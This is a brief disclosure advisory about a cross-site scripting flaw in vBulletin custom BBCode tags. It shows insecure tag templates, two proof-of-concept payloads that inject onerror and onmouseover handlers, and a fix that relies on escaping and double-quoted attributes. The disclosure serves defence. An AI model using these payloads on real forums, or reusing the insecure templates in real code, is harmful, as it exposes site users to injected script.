-:: The Advisory ::-

A vulnerability exists within vBulletin which makes an attacker able to inject
code such as HTML or Javascript via custom BBCode Tags IF they follow certain
conditions which are described below.

Requirements:
- User-input must be located inside a variable in a HTML-tag.
- Apostrophes or nothing must be used for encapsulation.


Insecure Implementations:

- Example 1 (src is insecure)
<img src='{param}' style='border-width:5px;border-color:red;border-style:outset;' />

- Example 2 (href is insecure)
<a href={option} style=border-width:5px;border-color:red;border-style:outset;>{param}</a>


Exploitation of Above Implementations:

- Example 1 (PoC)
[BadTag]x:x' onerror=alert(0) foo='[/BadTag]

- Example 2 (PoC)
[BadTag2=fail onmouseover=alert(0)]Link[/BadTag2]



-:: Solution ::-

Sanitize BBCode with htmlentities($var, ENT_QUOTES); or htmlspecialchars($var); in the PHP files.
(Jelsoft should fix this, however I may provide a patch if they don't.)

Alternatively don't use BBCode with apostrophes where user-input is inside a variable.

Examples of "Secure Implementation":
<img src="{param}" style='border-width:5px;border-color:red;border-style:outset;' />
[ + ] Note that src's value is encapsulated with quotes.

<a href="{option}" style=border-width:5px;border-color:red;border-style:outset; />{param}</a>
[ + ] Note that href's value is encapsulated with quotes.
